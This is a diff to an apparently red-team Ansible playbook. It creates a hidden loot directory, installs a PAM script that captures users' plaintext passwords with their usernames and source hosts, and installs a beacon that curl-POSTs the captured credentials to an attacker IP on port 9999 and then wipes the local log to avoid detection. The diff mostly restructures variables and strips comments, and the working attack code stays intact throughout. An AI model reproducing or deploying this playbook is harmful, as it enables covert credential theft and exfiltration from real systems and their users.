@@ -2,10 +2,11 @@
 # ===============================================================
 # CONFIGURATION: MANUAL ATTACKER IP
 # ===============================================================
-vars:
-  attacker_ip: "10.10.10.X"  # <--- SET YOUR RED WORKSTATION IP HERE
-  loot_dir: "/var/tmp/.system-cache"
-  loot_file: ".ssh_loot.txt"
+- name: Set Attacker IP for Beacon
+  set_fact:
+    attacker_ip: "10.10.10.X"  # <--- SET YOUR RED WORKSTATION IP HERE
+    loot_dir: "/var/tmp/.system-cache"
+    loot_file: ".ssh_loot.txt"
 
 # --- STEP 1: PREPARATION ---
 - name: Setup Hidden Loot Directory
@@ -23,7 +24,6 @@ vars:
     mode: '0755'
     content: |
       #!/bin/bash
-      # Intercepts passwords from PAM stdin
       read -r password
       echo "$(date) | User: $PAM_USER | From: $PAM_RHOST | Pass: $password" >> {{ loot_dir }}/{{ loot_file }}
 
@@ -42,12 +42,10 @@ vars:
     mode: '0755'
     content: |
       #!/bin/bash
-      # Targets the manually set Attacker IP
       ATTACKER_IP="{{ attacker_ip }}" 
       LOOT="{{ loot_dir }}/{{ loot_file }}"
 
       if [ -s "$LOOT" ]; then
-          # Send to your listener and wipe local file to stay quiet
           curl -s -X POST -d "$(cat $LOOT)" http://$ATTACKER_IP:9999/incoming >/dev/null 2>&1
           > "$LOOT"
       fi
